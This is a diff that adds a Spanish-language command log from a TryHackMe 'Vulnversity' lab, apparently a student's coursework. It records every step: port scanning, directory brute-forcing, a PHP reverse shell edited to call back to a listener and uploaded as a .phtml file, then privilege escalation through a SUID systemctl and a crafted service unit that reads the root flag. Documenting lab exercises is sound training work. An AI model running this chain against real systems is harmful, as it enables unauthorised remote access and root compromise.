@@ -1,0 +1,58 @@
+# ===== BITACORA DE COMANDOS - Sala: Vulnversity (Nivel 2) =====
+# Operador: Uriel Cabrera | THM: urimartincabrera123 | Objetivo: 10.66.178.71 | Fecha: 2026-10-07
+# Generado con el comando de la catedra (history + sed de redaccion de credenciales)
+# ==============================================================
+
+===== INICIO VULNVERSITY 2026-10-07 14:43 (ART) =====
+
+# --- Preparacion / Reconocimiento (shell local de Kali) ---
+ip addr show tun0
+ping -c3 10.66.178.71
+export TARGET=10.66.178.71
+stamp(){ echo "== Uriel Cabrera | THM:urimartincabrera123 | $(date '+%F %T %Z') | target:$TARGET =="; }
+echo "===== INICIO VULNVERSITY $(date '+%F %T') ====="
+stamp;
+ip addr show tun0
+ping -c3 10.66.178.71
+stamp;
+
+# --- Escaneo / Enumeracion ---
+nmap -sC -sV -p- $TARGET
+nmap -sV 10.66.178.71
+nmap -sC -sV -p- 10.66.178.71
+stamp;
+gobuster dir -u http://$TARGET:3333 -w /usr/share/wordlists/dirb/common.txt
+stamp;
+
+# --- Explotacion: preparacion del reverse shell ---
+firefox http://$TARGET:3333/internal/ &
+cd /home/cabrerauriel/
+cp /usr/share/webshells/php/php-reverse-shell.php ~/shell.phtml
+sed -i "s/127.0.0.1/192.168.150.220/; s/1234/4444/" ~/shell.phtml
+grep -nE "ip =|port =" ~/shell.phtml
+nc -lvnp 4444
+# (se sube shell.phtml por la pagina /internal/ y se dispara desde el navegador;
+#  el objetivo conecta de vuelta al listener -> shell como www-data)
+
+# ============================================================
+# Comandos ejecutados DENTRO del objetivo (via reverse shell, usuario www-data)
+# Nota: no figuran en el history local de Kali; se documentan aqui por completitud.
+# ============================================================
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+whoami; id
+find / -name "user.txt" 2>/dev/null
+cat /home/bill/user.txt
+cat /home/bill/user.txt | tr -d '\n' | sha256sum
+
+# --- Post-explotacion: escalada de privilegios (SUID en /bin/systemctl) ---
+find / -perm -4000 -type f 2>/dev/null
+# (intento con heredoc fallo al pegarse en el reverse shell; se rehizo con printf)
+cat > /tmp/root.service <<'EOF'
+printf '[Unit]\nDescription=pwn\n\n[Service]\nType=oneshot\nExecStart=/bin/bash -c "cat /root/root.txt > /tmp/rootflag.txt; chmod 777 /tmp/rootflag.txt"\n\n[Install]\nWantedBy=multi-user.target\n' > /tmp/root.service
+cat /tmp/root.service
+/bin/systemctl link /tmp/root.service
+/bin/systemctl start root.service
+cat /tmp/rootflag.txt
+cat /tmp/rootflag.txt | tr -d '\n' | sha256sum
+
+===== FIN VULNVERSITY (root conseguido) =====
